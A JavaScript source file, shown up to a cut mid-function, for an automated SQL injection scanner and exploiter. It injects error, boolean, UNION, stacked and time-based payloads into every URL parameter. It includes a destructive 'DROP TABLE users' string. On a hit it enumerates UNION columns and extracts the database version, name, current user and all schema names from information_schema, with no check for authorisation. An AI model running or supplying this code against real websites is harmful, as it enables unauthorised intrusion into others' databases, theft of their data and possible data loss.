import axios from 'axios';
import { createLogger } from '../utils/logger.js';
import { resolveOutputPath, appendToFile } from '../utils/fileOperations.js';

/**
 * SQLInjectionTester
 * ------------------
 * Performs a series of SQL-Injection checks (error-based, boolean-based, union-based, time-based).
 * The tester uses plain HTTP(S) requests via axios. It does **not** rely on a Puppeteer browser
 * instance, but an existing browser Page can be supplied to piggy-back on an already rotated IP / cookie.
 */
export class SQLInjectionTester {
    constructor(config = {}, logger = null) {
        this.config = {
            timeout: config.timeout || 30000,
            verbose: config.verbose || false,
            delay: config.testDelay || 0,
            outputFile: config.outputFile || resolveOutputPath('vuln.txt'),
            // Thresholds
            lengthDelta: config.lengthDelta || 100, // bytes difference considered interesting
            timeDelayThreshold: config.timeDelayThreshold || 4000, // ms
            ...config
        };

        this.logger = logger;
        this.stats = {
            totalUrls: 0,
            testedUrls: 0,
            totalVulnerableUrls: 0,
            totalRequests: 0,
            vulnerableDetails: []
        };

        this.basePayloads = {
            error: ["'", "\"", "`", "'\""],
            boolean: ["' OR 1=1-- -", "' OR '1'='1'-- -"],
            union: ["' UNION SELECT {cols}-- -", "' UNION ALL SELECT {cols}-- -"],
            stacked: ["'; DROP TABLE users--", "'; SELECT pg_sleep(1)--"],
            time: ["' AND SLEEP({delay})-- -", "'; WAITFOR DELAY '00:00:0{delay}'-- -"]
        };

        // Generate payloads on construction
        this.payloads = this._generatePayloads();
    }

    /**
     * Create a rich set of payloads with randomised values so each run differs.
     */
    _generatePayloads() {
        const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

        const payloads = {};

        // Error based – static list is fine
        payloads.error = [...this.basePayloads.error];

        // Boolean based – vary numeric comparisons
        payloads.boolean = [];
        for (let i = 0; i < 3; i++) {
            const a = randInt(1, 5);
            const b = randInt(6, 10);
            payloads.boolean.push(`' OR ${a}=${a}-- -`);
            payloads.boolean.push(`" OR ${a}=${a}#`);
            payloads.boolean.push(`') OR (${a}=${a}/*`);
            payloads.boolean.push(`' OR ${a}=${b}-- -`); // false case to compare
        }

        // UNION injections – try 1-6 columns
        payloads.union = [];
        for (let cols = 1; cols <= 6; cols++) {
            const list = Array.from({ length: cols }, (_, idx) => idx + 1).join(',');
            this.basePayloads.union.forEach(t => {
                payloads.union.push(t.replace('{cols}', list));
            });
        }
        
        // Add negative ID UNION payloads for better compatibility
        payloads.union.push("-999' UNION SELECT 1-- -");
        payloads.union.push("-999' UNION SELECT 1,2-- -");
        payloads.union.push("-999' UNION SELECT 1,2,3-- -");

        // Stacked queries – include random benign statements
        payloads.stacked = [];
        const benign = ['SELECT 1', 'SELECT @@version', 'SELECT NULL'];
        benign.forEach(b => {
            payloads.stacked.push(`'; ${b}--`);
        });

        // Time based – vary delays 3-8 seconds
        payloads.time = [];
        for (let delay = 3; delay <= 6; delay++) {
            this.basePayloads.time.forEach(t => {
                payloads.time.push(t.replace('{delay}', delay));
            });
        }

        return payloads;
    }

    async initialize() {
        if (!this.logger) {
            this.logger = await createLogger(false, true);
        }
        this.logger.info('SQLInjectionTester initialised');
    }

    /**
     * Test an array of URLs for SQL-Injection vulnerabilities.
     * @param {string[]} urls
     * @param {object} _browser Ignored – kept for API parity with other call-sites.
     */
    async testUrls(urls = [], _browser = null) {
        this.stats.totalUrls = urls.length;
        const results = [];

        for (const url of urls) {
            try {
                const res = await this._testSingleUrl(url);
                results.push(res);
                if (res.vulnerable) {
                    await this._saveVulnerableUrl(res.url);
                }
            } catch (err) {
                this.logger.error('Error testing URL', { url, error: err.message });
                results.push({ url, vulnerable: false, error: err.message });
            }
        }
        return results;
    }

    getStats() {
        return this.stats;
    }

    async cleanup() {
        // Nothing to cleanup for axios based tester currently
    }

    /* ------------------- Private Helpers ------------------- */

    async _testSingleUrl(targetUrl) {
        this.stats.testedUrls += 1;
        const result = { url: targetUrl, vulnerable: false, vulnerabilities: [] };
        
        this.logger?.info(`Starting SQL injection test for URL: ${targetUrl}`);

        // Get baseline response
        let baseline;
        try {
            const start = Date.now();
            this.logger?.debug(`Sending baseline request to: ${targetUrl}`);
            const resp = await axios.get(targetUrl, { timeout: this.config.timeout, validateStatus: () => true });
            const duration = Date.now() - start;
            const bodyStr = resp.data ? resp.data.toString() : '';
            const globalErrRegex = /(sql syntax|mysql_fetch|ORA-\d+|SQLiteException|MariaDB|SQLSTATE|syntax error|Warning.*mysql|Unclosed quotation mark after the character string)/i;
            baseline = {
                status: resp.status,
                length: bodyStr.length,
                body: bodyStr.slice(0, 1000),
                duration,
                errorInBaseline: globalErrRegex.test(bodyStr)
            };
            this.stats.totalRequests += 1;
            this.logger?.info(`Baseline established for ${targetUrl}`, {
                status: baseline.status,
                length: baseline.length,
                duration: baseline.duration,
                errorInBaseline: baseline.errorInBaseline
            });
            if (this.config.verbose) {
                this.logger.debug(`Baseline for ${targetUrl} – status ${baseline.status}, len ${baseline.length}, time ${duration}ms`);
            }
        } catch (error) {
            this.logger?.error(`Baseline request failed for ${targetUrl}`, { error: error.message });
            throw new Error(`Baseline request failed – ${error.message}`);
        }

        // Parse query parameters
        let urlObj;
        try {
            urlObj = new URL(targetUrl);
        } catch {
            this.logger?.error(`Invalid URL format: ${targetUrl}`);
            throw new Error('Invalid URL');
        }

        // Iterate parameters
        const params = Array.from(urlObj.searchParams.keys());
        this.logger?.info(`Found ${params.length} parameters to test: ${params.join(', ')}`);
        if (params.length === 0) {
            this.logger?.warn(`No query parameters found in URL: ${targetUrl}`);
            return { ...result, note: 'No query parameters' };
        }

        for (const param of params) {
            const originalVal = urlObj.searchParams.get(param) || '';
            this.logger?.debug(`Testing parameter '${param}' with original value: ${originalVal}`);

            // For each payload type
            for (const [type, payloadsArr] of Object.entries(this.payloads)) {
                this.logger?.debug(`Testing ${type} injection on parameter '${param}'`);
                for (const payload of payloadsArr) {
                    const injectedVal = originalVal + payload;
                    // Clone the URL for each test to avoid modifying the original
                    const testUrlObj = new URL(targetUrl);
                    testUrlObj.searchParams.set(param, injectedVal);
                    const testUrl = testUrlObj.toString();
                    
                    this.logger?.debug(`Testing payload on ${param}`, {
                        type,
                        payload: payload,
                        fullTestUrl: testUrl,
                        parameter: param,
                        originalValue: originalVal,
                        injectedValue: injectedVal
                    });

                    const testOutcome = await this._sendAndCompare(testUrl, baseline, type, payload);
                    this.logger?.info(`Payload test result for ${param}`, {
                        type,
                        payload: payload,
                        fullTestUrl: testUrl,
                        vulnerable: testOutcome.vulnerable,
                        evidence: testOutcome.evidence,
                        responseTime: testOutcome.responseTime,
                        parameter: param,
                        originalValue: originalVal,
                        injectedValue: injectedVal
                    });
                     
                    if (testOutcome.vulnerable) {
                        this.logger?.warn(`Potential vulnerability detected for ${param}`, {
                            type,
                            payload: payload,
                            fullTestUrl: testUrl,
                            evidence: testOutcome.evidence,
                            responseTime: testOutcome.responseTime,
                            parameter: param,
                            originalValue: originalVal,
                            injectedValue: injectedVal,
                            host: urlObj.host
                        });
                         
                        // CRITICAL: Attempt database extraction to confirm it's real SQL injection
                        this.logger?.info(`Attempting database extraction to confirm vulnerability`);
                        const dbInfo = await this._attemptDbExtraction(testUrlObj, param, {
                            vulnType: type,
                            hint: testOutcome.dbTypeHint,
                        });
                        
                        // For UNION injections, if we can successfully inject with different column counts,
                        // it's very likely a real vulnerability even without full DB extraction
                        const isLikelyRealVuln = (
                            type === 'union' || 
                            type === 'boolean' || 
                            type === 'time' ||
                            (dbInfo && (dbInfo.type || dbInfo.version || dbInfo.name))
                        );
                         
                        if (!isLikelyRealVuln) {
                            // No DB info extracted = likely false positive
                            this.logger?.warn(`FALSE POSITIVE detected for ${urlObj.host}`, {
                                parameter: param,
                                type,
                                payload: payload,
                                fullTestUrl: testUrl,
                                reason: 'No database information extracted',
                                evidence: testOutcome.evidence,
                                responseTime: testOutcome.responseTime,
                                host: urlObj.host,
                                originalValue: originalVal,
                                injectedValue: injectedVal
                            });
                            continue; // Skip this payload, try next one
                        }

                        // Confirmed vulnerability with DB extraction
                        if (!result.vulnerable) result.vulnerable = true;
                        if (!result.database) {
                            result.database = dbInfo;
                            this.logger?.error(`CONFIRMED SQL INJECTION VULNERABILITY`, {
                                host: urlObj.host,
                                url: targetUrl,
                                fullTestUrl: testUrl,
                                parameter: param,
                                type,
                                payload: payload,
                                database: dbInfo,
                                evidence: testOutcome.evidence,
                                responseTime: testOutcome.responseTime,
                                originalValue: originalVal,
                                injectedValue: injectedVal,
                                extractionSuccessful: true
                            });
                        }

                        result.vulnerabilities.push({
                            type,
                            parameter: param,
                            payload,
                            url: testUrl,
                            evidence: testOutcome.evidence,
                            responseTime: testOutcome.responseTime,
                            database: dbInfo
                        });
                          
                        this.logger?.info(`Vulnerability added to results`, {
                            totalVulnerabilities: result.vulnerabilities.length
                        });
                        // If any payload hits, we can break earlier to save requests
                        break;
                    }
                    // Delay between payloads if configured
                    if (this.config.delay) {
                        this.logger?.debug(`Applying delay of ${this.config.delay}ms between payloads`);
                        await new Promise(r => setTimeout(r, this.config.delay));
                    }
                }
            }
        }

        if (result.vulnerable) {
            this.stats.totalVulnerableUrls += 1;
            this.stats.vulnerableDetails.push({ url: targetUrl, count: result.vulnerabilities.length });
            this.logger?.error(`URL CONFIRMED VULNERABLE`, {
                url: targetUrl,
                vulnerabilityCount: result.vulnerabilities.length,
                database: result.database
            });
        } else {
            this.logger?.info(`URL tested clean - no vulnerabilities found: ${targetUrl}`);
        }
          
        return result;
    }

    async _sendAndCompare(testUrl, baseline, type, payload) {
        try {
            this.logger?.debug(`Sending test request`, { 
                fullTestUrl: testUrl, 
                type,
                payload: payload
            });
            const start = Date.now();
            const resp = await axios.get(testUrl, { timeout: this.config.timeout, validateStatus: () => true });
            const duration = Date.now() - start;
            this.stats.totalRequests += 1;
            
            const bodyText = resp.data ? resp.data.toString() : '';
            
            this.logger?.debug(`Test response received`, {
                status: resp.status,
                duration,
                contentLength: bodyText.length,
                fullTestUrl: testUrl,
                type,
                payload: payload,
                responseHeaders: resp.headers,
                responsePreview: bodyText.slice(0, 500)
            });
            const length = bodyText.length;
            const statusChanged = resp.status !== baseline.status;
            const lengthChanged = Math.abs(length - baseline.length) > this.config.lengthDelta;

            // Enhanced SQL error detection
            const errorRegex = /(sql syntax|mysql_fetch|ORA-\d+|SQLiteException|MariaDB|SQLSTATE|syntax error|Warning.*mysql|Unclosed quotation mark|OLE DB|ODBC|ADO|JET Database|Access Database|Syntax error in|Microsoft Access Driver|Microsoft JET Database|Oracle error|PostgreSQL|Fatal error|mysql_num_rows|mysql_connect|pg_connect|mssql_query|sybase_|ingres_|msql_|oracle_|oci_|db2_|sqlite_)/i;
            const errorMatch = errorRegex.test(bodyText);

            // Get a hint about the DB type from the error message to guide extraction
            let dbTypeHint = null;
            if (errorMatch) {
                dbTypeHint = this._parseDbInfoFromText(bodyText);
                this.logger?.debug(`Database type hinted from error message`, {
                    dbTypeHint,
                    payload: payload,
                    fullTestUrl: testUrl
                });
            }

            // Additional validation: check if response looks like a real SQL error vs generic error page
            const genericErrorIndicators = [
                /server error/i,
                /internal error/i,
                /an error occurred/i,
                /system administrator/i,
                /contact.*administrator/i,
                /error 500/i,
                /something went wrong/i
            ];
            const isGenericError = genericErrorIndicators.some(regex => regex.test(bodyText));
            
            this.logger?.debug(`Response analysis`, {
                statusChanged,
                lengthChanged: lengthChanged ? `${baseline.length} -> ${length}` : false,
                errorMatch,
                isGenericError,
                type,
                payload: payload,
                fullTestUrl: testUrl,
                baselineStatus: baseline.status,
                testStatus: resp.status,
                baselineLength: baseline.length,
                testLength: length,
                lengthDelta: Math.abs(length - baseline.length)
            });

            if (type === 'time') {
                // More strict time-based validation
                const expectedDelay = this._extractDelayFromPayload(payload);
                const actualDelay = duration - baseline.duration;
                this.logger?.debug(`Time-based analysis`, {
                    expectedDelay,
                    actualDelay,
                    baselineDuration: baseline.duration,
                    testDuration: duration,
                    threshold: expectedDelay * 1000 * 0.8,
                    payload: payload,
                    fullTestUrl: testUrl,
                    type
                });
                if (actualDelay >= (expectedDelay * 1000 * 0.8)) { // 80% of expected delay
                    this.logger?.warn(`Time-based injection detected`, { 
                        actualDelay, 
                        expectedDelay,
                        payload: payload,
                        fullTestUrl: testUrl,
                        baselineDuration: baseline.duration,
                        testDuration: duration
                    });
                    return { vulnerable: true, evidence: `Delayed response ${duration}ms`, responseTime: duration };
                }
            } else if (type === 'error') {
                // Skip if baseline already had error
                if (!baseline.errorInBaseline && errorMatch && !isGenericError) {
                    this.logger?.warn(`Error-based injection detected`, { 
                        errorMatch: true, 
                        isGenericError,
                        payload: payload,
                        fullTestUrl: testUrl,
                        responsePreview: bodyText.slice(0, 500)
                    });
                    return { vulnerable: true, evidence: 'Database error message detected', responseTime: duration, dbTypeHint };
                }
            } else if (type === 'boolean') {
                // For boolean, be more strict - require significant changes
                if (statusChanged && lengthChanged && !isGenericError) {
                    this.logger?.warn(`Boolean injection detected (status+length change)`, {
                        statusChanged,
                        lengthChanged,
                        isGenericError,
                        payload,
                        fullTestUrl: testUrl,
                        baselineStatus: baseline.status,
                        testStatus: resp.status,
                        baselineLength: baseline.length,
                        testLength: length
                    });
                    return { vulnerable: true, evidence: 'Boolean injection confirmed (status & length change)', responseTime: duration };
                } else if (errorMatch && !baseline.errorInBaseline && !isGenericError) {
                    this.logger?.warn(`Boolean injection with DB error detected`, {
                        errorMatch,
                        isGenericError,
                        payload,
                        fullTestUrl: testUrl,
                        responsePreview: bodyText.slice(0, 500)
                    });
                    return { vulnerable: true, evidence: 'Boolean injection with database error', responseTime: duration, dbTypeHint };
                }
            } else if (type === 'stacked') {
                if ((statusChanged || lengthChanged || (errorMatch && !baseline.errorInBaseline)) && !isGenericError) {
                    this.logger?.warn(`Stacked query injection detected`, {
                        statusChanged,
                        lengthChanged,
                        errorMatch,
                        isGenericError,
                        payload,
                        fullTestUrl: testUrl,
                        baselineStatus: baseline.status,
                        testStatus: resp.status,
                        baselineLength: baseline.length,
                        testLength: length
                    });
                    const evidence = errorMatch ? 'SQL error after stacked query' : 'Response anomaly after stacked query';
                    return { vulnerable: true, evidence, responseTime: duration };
                }
            } else if (type === 'union') {
                if ((statusChanged || lengthChanged || (errorMatch && !baseline.errorInBaseline)) && !isGenericError) {
                    this.logger?.warn(`UNION injection detected`, {
                        statusChanged,
                        lengthChanged,
                        errorMatch,
                        isGenericError,
                        payload,
                        fullTestUrl: testUrl,
                        baselineStatus: baseline.status,
                        testStatus: resp.status,
                        baselineLength: baseline.length,
                        testLength: length
                    });
                    const evidence = statusChanged
                        ? 'UNION injection (status change)'
                        : lengthChanged
                        ? 'UNION injection (length change)'
                        : 'UNION injection (SQL error)';
                    return { vulnerable: true, evidence, responseTime: duration };
                }
            }

            // No indicators – considered safe
            return { vulnerable: false };

        } catch (error) {
            this.logger?.error(`Error during test request`, {
                fullTestUrl: testUrl,
                error: error.message,
                payload,
                type,
                errorStack: error.stack
            });
            return { vulnerable: false, error: error.message };
        }
    }
    
    /**
     * Extracts structured DB info from text using a variety of regex patterns.
     */
    _parseDbInfoFromText(bodyText) {
        if (!bodyText) return null;

        const dbInfo = { type: null, version: null, name: null };

        // Database type detection
        const typePatterns = [
            { regex: /mysql/i, type: 'MySQL' },
            { regex: /mariadb/i, type: 'MariaDB' },
            { regex: /microsoft.*sql.*server/i, type: 'Microsoft SQL Server' },
            { regex: /postgresql/i, type: 'PostgreSQL' },
            { regex: /oracle/i, type: 'Oracle' },
            { regex: /sqlite/i, type: 'SQLite' }
        ];

        for (const { regex, type } of typePatterns) {
            if (regex.test(bodyText)) {
                dbInfo.type = type;
                break;
            }
        }

        // Version extraction - look for actual version numbers
        const versionPatterns = [
            // MySQL version patterns
            /(\d+\.\d+\.\d+(?:-\w+)?)-log/i,
            /mysql\s+(\d+\.\d+\.\d+)/i,
            /mariadb\s+(\d+\.\d+\.\d+)/i,
            // Generic version patterns
            /version[:\s]+(\d+\.\d+\.\d+(?:\.\d+)?)/i,
            /(\d+\.\d+\.\d+\.\d+)/,
            // Extract from DB_INFO markers
            /DB_INFO:([^|]+)\|/i,
            // Extract from XML error tags
            /~([^~]+)~/,
            // Extract from EXTRACTVALUE errors
            /XPATH syntax error:\s*'~([^~']+)'/i
        ];

        for (const pattern of versionPatterns) {
            const match = bodyText.match(pattern);
            if (match && match[1]) {
                const version = match[1].trim();
                // Skip obvious error codes
                if (!version.match(/^40[0-9]\./)) {
                    dbInfo.version = version;
                    break;
                }
            }
        }

        // Database name extraction patterns
        const namePatterns = [
            // From DB_INFO markers
            /DB_INFO:[^|]*\|([^|]+)\|/i,
            // From structured extraction
            /\|DB:([^|]+)\|/,
            /\|ALL:([^<\s]+)/,
            // From error messages - more specific
            /database\s+(?:is|name|:)\s*['"` ]?([a-zA-Z0-9_]+)['"` ]?/i,
            /schema\s+(?:is|name|:)\s*['"` ]?([a-zA-Z0-9_]+)['"` ]?/i,
            /Unknown database\s+['"` ]([a-zA-Z0-9_]+)['"` ]/i,
            /Table\s+'[^.]+\.([^']+)'/i, // Table 'database.table'
            // From EXTRACTVALUE errors
            /~[^|]*\|([^|~]+)~/,
            // From conversion errors
            /converting the \w+ value '([^']+)' to data type/i
        ];

        for (const pattern of namePatterns) {
            const match = bodyText.match(pattern);
            if (match && match[1]) {
                const name = match[1].trim();
                // Skip common non-database words and JS libraries
                const blacklist = ['null', 'undefined', 'error', 'warning', 'info', 'debug', 
                                 'magiczoom', 'jquery', 'bootstrap', 'react', 'angular', 'vue'];
                if (name.length > 2 && !blacklist.includes(name.toLowerCase())) {
                    dbInfo.name = name;
                    break;
                }
            }
        }

        // If we found any information, return it
        if (dbInfo.type || dbInfo.version || dbInfo.name) {
            return dbInfo;
        }

        return null;
    }

    /**
     * A more robust multi-stage attempt to extract database information
     */
    async _attemptDbExtraction(baseUrlObj, param, vulnContext) {
        const { vulnType, hint } = vulnContext;
        this.logger?.info(`Starting database extraction`, { host: baseUrlObj.host, param, hint });

        const dbInfo = {
            type: hint?.type || null,
            version: hint?.version || null,
            name: hint?.name || null
        };

        // Try different extraction methods based on vulnerability type
        if (vulnType === 'union') {
            await this._attemptUnionExtraction(baseUrlObj, param, dbInfo);
        } else if (vulnType === 'boolean' || vulnType === 'error') {
            await this._attemptErrorBasedExtraction(baseUrlObj, param, dbInfo);
        }

        this.logger?.info(`Final extracted DB info`, dbInfo);
        return dbInfo.type || dbInfo.version || dbInfo.name ? dbInfo : null;
    }

    /**
     * Attempt UNION-based extraction
     */
    async _attemptUnionExtraction(baseUrlObj, param, dbInfo) {
        const originalValue = baseUrlObj.searchParams.get(param);
        let workingPayload = null;
        let columnCount = 0;
        let dataColumn = -1;
        
        // Step 1: Find the correct number of columns (try up to 50)
        this.logger?.info(`Testing UNION column count for ${param}`);
        
        let previousLength = 0;
        let stableCount = 0;
        const lengthCounts = new Map(); // Track which lengths appear how often
        
        for (let cols = 1; cols <= 50; cols++) {
            try {
                const testUrlObj = new URL(baseUrlObj);
                // Use negative ID to isolate UNION results
                const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                const unionPayload = ` UNION SELECT ${Array(cols).fill('NULL').join(',')}-- -`;
                testUrlObj.searchParams.set(param, negativeId + unionPayload);
                
                const response = await this._makeRequest(testUrlObj.toString());
                const currentLength = response.data.length;
                
                // Track response lengths
                lengthCounts.set(currentLength, (lengthCounts.get(currentLength) || 0) + 1);
                
                // Debug logging
                if (cols <= 5 || cols % 10 === 0) {
                    this.logger?.debug(`Testing ${cols} columns`, {
                        status: response.status,
                        length: currentLength,
                        lengthDiff: currentLength - previousLength,
                        hasError: response.data.includes('error') || response.data.includes('Error'),
                        sample: response.data.substring(0, 200)
                    });
                }
                
                // Check if this column count works
                const responseText = response.data.toLowerCase();
                const hasColumnError = responseText.includes('different number of columns') ||
                                     responseText.includes('columns') ||
                                     responseText.includes('operand should contain') ||
                                     responseText.includes('used have a different number');
                
                const hasSQLError = responseText.includes('sql syntax') ||
                                   responseText.includes('mysql') && responseText.includes('error') ||
                                   responseText.includes('warning:') ||
                                   responseText.includes('mysqli');
                
                // Method 1: Look for SQL errors
                if (hasColumnError || hasSQLError) {
                    this.logger?.debug(`Column error at ${cols} columns`);
                    continue;
                }
                
                // Method 2: Try injecting a test value to see if it reflects
                if (response.status === 200 && !hasColumnError && !hasSQLError) {
                    const testUrlObj2 = new URL(baseUrlObj);
                    const testValue = `0x${Buffer.from(`COL${cols}TEST`).toString('hex')}`;
                    const columns2 = Array(cols).fill('NULL');
                    columns2[Math.floor(cols/2)] = testValue; // Try middle column
                    const unionPayload2 = ` UNION SELECT ${columns2.join(',')}-- -`;
                    testUrlObj2.searchParams.set(param, negativeId + unionPayload2);
                    
                    const response2 = await this._makeRequest(testUrlObj2.toString());
                    
                    // If we see our test value, we found the right column count
                    if (response2.data.includes(`COL${cols}TEST`)) {
                        columnCount = cols;
                        this.logger?.info(`Found working column count via reflection: ${cols}`);
                        break;
                    }
                }
                
                // Method 3: Look for stable response length (same length 3 times)
                if (currentLength === previousLength) {
                    stableCount++;
                    if (stableCount >= 2) {
                        // Also verify with a different value
                        const testUrlObj3 = new URL(baseUrlObj);
                        const columns3 = Array(cols).fill('1');
                        const unionPayload3 = ` UNION SELECT ${columns3.join(',')}-- -`;
                        testUrlObj3.searchParams.set(param, negativeId + unionPayload3);
                        
                        const response3 = await this._makeRequest(testUrlObj3.toString());
                        
                        if (Math.abs(response3.data.length - currentLength) < 100) {
                            columnCount = cols;
                            this.logger?.info(`Found working column count via stable length: ${cols}`);
                            break;
                        }
                    }
                } else {
                    stableCount = 0;
                }
                
                // Method 4: Detect linear length increase pattern (NULL values being displayed)
                if (cols > 2 && previousLength > 0) {
                    const lengthDiff = currentLength - previousLength;
                    if (lengthDiff > 0 && lengthDiff < 50) {
                        // For linear patterns, continue testing more columns
                        // Don't stop too early - websites may have many columns
                        if (cols < 40) {
                            // Keep testing
                            previousLength = currentLength;
                            continue;
                        }
                        
                        // After testing enough columns, confirm the pattern
                        const testUrlObj4 = new URL(baseUrlObj);
                        const testCols = 32; // Common column count
                        const unionPayload4 = ` UNION SELECT ${Array(testCols).fill('NULL').join(',')}-- -`;
                        testUrlObj4.searchParams.set(param, negativeId + unionPayload4);
                        
                        try {
                            const response4 = await this._makeRequest(testUrlObj4.toString());
                            // Calculate expected length based on pattern
                            const expectedLength = response.data.length + (testCols - cols) * lengthDiff;
                            
                            if (Math.abs(response4.data.length - expectedLength) < 100) {
                                columnCount = testCols;
                                this.logger?.info(`Found working column count via linear pattern: ${testCols} (${lengthDiff} bytes per column)`);
                                break;
                            }
                        } catch (error) {
                            // Try with current column count
                            columnCount = cols;
                            this.logger?.info(`Found working column count via linear pattern: ${cols} (${lengthDiff} bytes per column)`);
                            break;
                        }
                    }
                }
                
                previousLength = currentLength;
                
            } catch (error) {
                this.logger?.debug(`Error testing ${cols} columns: ${error.message}`);
            }
        }
        
        // If we still haven't found it, try the most common response length
        if (columnCount === 0 && lengthCounts.size > 0) {
            // Find the most common response length
            let maxCount = 0;
            let mostCommonLength = 0;
            for (const [length, count] of lengthCounts) {
                if (count > maxCount) {
                    maxCount = count;
                    mostCommonLength = length;
                }
            }
            
            // Test columns that gave this length
            for (let cols = 1; cols <= 50; cols++) {
                const testUrlObj = new URL(baseUrlObj);
                const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                const unionPayload = ` UNION SELECT ${Array(cols).fill('NULL').join(',')}-- -`;
                testUrlObj.searchParams.set(param, negativeId + unionPayload);
                
                try {
                    const response = await this._makeRequest(testUrlObj.toString());
                    if (Math.abs(response.data.length - mostCommonLength) < 50) {
                        columnCount = cols;
                        this.logger?.info(`Found probable column count: ${cols} (based on common length)`);
                        break;
                    }
                } catch (error) {
                    // Continue
                }
            }
        }
        
        if (columnCount === 0) {
            this.logger?.warn(`Could not determine column count for UNION injection`);
            return;
        }
        
        // Step 2: Find which column(s) are displayed (try each position)
        const testString = `CONCAT(0x${Buffer.from('TESTMARKER').toString('hex')},0x${Buffer.from('12345').toString('hex')})`;
        
        // Try common positions first, then all columns
        const priorityColumns = [0, Math.floor(columnCount/2), columnCount-1];
        
        for (const colIndex of priorityColumns) {
            if (colIndex >= columnCount) continue;
            
            try {
                const testUrlObj = new URL(baseUrlObj);
                const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                const columns = Array(columnCount).fill('NULL');
                columns[colIndex] = testString;
                const unionPayload = ` UNION SELECT ${columns.join(',')}-- -`;
                testUrlObj.searchParams.set(param, negativeId + unionPayload);
                
                const response = await this._makeRequest(testUrlObj.toString());
                
                if (response.data.includes('TESTMARKER12345')) {
                    dataColumn = colIndex;
                    this.logger?.info(`Found data reflection in column ${colIndex + 1}`);
                    break;
                }
            } catch (error) {
                // Continue
            }
        }
        
        // If priority columns didn't work, try all columns
        if (dataColumn === -1) {
            for (let col = 0; col < columnCount; col++) {
                if (priorityColumns.includes(col)) continue; // Skip already tested
                
                try {
                    const testUrlObj = new URL(baseUrlObj);
                    const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                    const columns = Array(columnCount).fill('NULL');
                    columns[col] = testString;
                    const unionPayload = ` UNION SELECT ${columns.join(',')}-- -`;
                    testUrlObj.searchParams.set(param, negativeId + unionPayload);
                    
                    const response = await this._makeRequest(testUrlObj.toString());
                    
                    if (response.data.includes('TESTMARKER12345')) {
                        dataColumn = col;
                        this.logger?.info(`Found data reflection in column ${col + 1}`);
                        break;
                    }
                } catch (error) {
                    // Continue
                }
            }
        }
        
        if (dataColumn === -1) {
            this.logger?.warn(`Could not find reflecting column in UNION injection`);
            // Try with column 0 anyway
            dataColumn = 0;
        }
        
        // Step 3: Extract database information using the found column
        const extractionQueries = [
            // MySQL/MariaDB queries - try to get all info at once
            `CONCAT(0x${Buffer.from('DBSTART:').toString('hex')},@@version,0x${Buffer.from('|').toString('hex')},DATABASE(),0x${Buffer.from('|').toString('hex')},USER(),0x${Buffer.from('|DBLIST:').toString('hex')},(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),0x${Buffer.from(':DBEND').toString('hex')})`,
            // Simpler version with all databases
            `CONCAT(0x${Buffer.from('VER:').toString('hex')},@@version,0x${Buffer.from('|DB:').toString('hex')},DATABASE(),0x${Buffer.from('|ALL:').toString('hex')},(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))`,
            // Just get all databases
            `(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x${Buffer.from(',').toString('hex')}) FROM information_schema.schemata)`,
            // Get non-system databases
            `(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x${Buffer.from(',').toString('hex')}) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys'))`,
            // Basic queries
            `CONCAT(@@version,0x${Buffer.from('~~~').toString('hex')},DATABASE())`,
            `VERSION()`,
            `DATABASE()`,
            `@@version`,
            `SCHEMA()`,
            // Try with LIMIT for single database
            `(SELECT schema_name FROM information_schema.schemata LIMIT 0,1)`
        ];
        
        for (const query of extractionQueries) {
            try {
                const testUrlObj = new URL(baseUrlObj);
                const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                const columns = Array(columnCount).fill('NULL');
                columns[dataColumn] = query;
                const unionPayload = ` UNION SELECT ${columns.join(',')}-- -`;
                testUrlObj.searchParams.set(param, negativeId + unionPayload);
                
                const response = await this._makeRequest(testUrlObj.toString());
                
                if (response.status === 200) {
                    // Look for extracted data
                    const responseText = response.data;
                    
                    // Check for our markers
                    if (responseText.includes('DBSTART:') && responseText.includes(':DBEND')) {
                        const match = responseText.match(/DBSTART:([^|]+)\|([^|]+)\|([^|]+)\|DBLIST:([^:]+):DBEND/);
                        if (match) {
                            dbInfo.version = match[1].trim();
                            dbInfo.name = match[2].trim();
                            dbInfo.type = this._detectDbType(match[1]);
                            // Extract all databases
                            const allDbs = match[4].trim();
                            if (allDbs) {
                                dbInfo.databases = allDbs.split(',').filter(db => db && db.trim());
                            }
                            this.logger?.info(`Extracted via markers:`, dbInfo);
                            workingPayload = { columnCount, dataColumn: dataColumn + 1, query };
                            break;
                        }
                        // Try older format without DBLIST
                        const oldMatch = responseText.match(/DBSTART:([^:]+)\|([^|]+)\|([^:]+):DBEND/);
                        if (oldMatch) {
                            dbInfo.version = oldMatch[1].trim();
                            dbInfo.name = oldMatch[2].trim();
                            dbInfo.type = this._detectDbType(oldMatch[1]);
                            this.logger?.info(`Extracted via markers (old format):`, dbInfo);
                            workingPayload = { columnCount, dataColumn: dataColumn + 1, query };
                            break;
                        }
                    }
                    
                    // Check for VER/DB/ALL format
                    if (responseText.includes('VER:') && responseText.includes('|ALL:')) {
                        const match = responseText.match(/VER:([^|]+)\|DB:([^|]+)\|ALL:([^<\s]+)/);
                        if (match) {
                            dbInfo.version = match[1].trim();
                            dbInfo.name = match[2].trim();
                            dbInfo.type = this._detectDbType(match[1]);
                            const allDbs = match[3].trim();
                            if (allDbs) {
                                dbInfo.databases = allDbs.split(',').filter(db => db && db.trim());
                            }
                            this.logger?.info(`Extracted all databases:`, dbInfo);
                            workingPayload = { columnCount, dataColumn: dataColumn + 1, query };
                            break;
                        }
                    }
                    
                    // Try parsing normally
                    const extracted = this._parseDbInfoFromText(responseText);
                    if (extracted && (extracted.version || extracted.name)) {
                        Object.assign(dbInfo, extracted);
                        this.logger?.info(`Successfully extracted DB info via UNION`, { ...extracted, columnUsed: dataColumn + 1 });
                        workingPayload = { columnCount, dataColumn: dataColumn + 1, query };
                        break;
                    }
                    
                    // Check for version patterns
                    const versionMatch = responseText.match(/(\\d+\\.\\d+\\.\\d+[^<\\s]*)/);
                    if (versionMatch && !versionMatch[1].startsWith('40')) {
                        dbInfo.version = versionMatch[1];
